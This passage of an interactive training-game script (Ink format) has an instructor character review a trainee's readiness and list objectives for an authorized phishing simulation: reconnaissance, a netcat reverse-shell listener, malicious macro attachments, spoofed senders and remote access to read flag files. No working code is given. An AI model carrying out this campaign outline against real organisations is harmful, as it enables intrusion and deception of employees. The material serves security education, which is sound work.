- Technical details for security teams
- Retest to verify fixes

Social Engineering Specialist: This structured, authorized, documented process is what makes penetration testing ethical and legal. Everything else is unauthorized hacking.

~ instructor_rapport += 15
-> social_engineering_hub

// ===========================================
// READY FOR SIMULATION
// ===========================================

=== ready_for_simulation ===

Social Engineering Specialist: Good. Let's review readiness:

{reconnaissance_discussed and phishing_basics_discussed and malicious_attachments_discussed:
    Social Engineering Specialist: You've covered the core material. You understand reconnaissance, phishing tactics, and payload creation.
- else:
    Social Engineering Specialist: You might want to review topics you haven't covered. But you've got enough to attempt the simulation.
}

{ethics_discussed or ethical_awareness_shown:
    Social Engineering Specialist: And you're clear on ethical boundaries. That's critical.
- else:
    Social Engineering Specialist: Before you start—review the ethics discussion. Understanding legal and ethical constraints is non-negotiable.
}

Social Engineering Specialist: Simulation objectives:
1. Reconnaissance on accountingnow.com—identify targets
2. Set up netcat listener for reverse shells
3. Create malicious attachments (macros or executables)
4. Craft convincing phishing emails
5. Spoof sender addresses for credibility
6. Send targeted emails to employees
7. Gain remote access when victims open attachments
8. Read flag files from victim home directories

Social Engineering Specialist: Remember: in the simulation, victims provide feedback. They'll tell you why they don't trust your emails. Use that intelligence to refine your approach.

Social Engineering Specialist: This is iterative social engineering. First attempt might fail. Adjust and try again. That's realistic—real attackers iterate too.

{instructor_rapport >= 60:
    Social Engineering Specialist: You've demonstrated strong understanding and good ethical awareness. You're well-prepared for this exercise.
}

Social Engineering Specialist: Final reminder: these are authorized simulations for defensive learning. Good luck, Agent {player_name}.

-> end_session

// ===========================================
// END SESSION
// ===========================================

=== end_session ===

Social Engineering Specialist: Whenever you need guidance on social engineering techniques or ethical considerations, I'm available.

{ethical_awareness_shown:
    Social Engineering Specialist: I'm confident you'll use these skills responsibly. You've demonstrated solid ethical judgment.
}

Social Engineering Specialist: Social engineering exploits human nature. Understanding these attacks makes you a better defender—and a more effective penetration tester within authorized engagements.

Social Engineering Specialist: Now demonstrate what you've learned. And remember: authorized testing only.

#exit_conversation
-> END
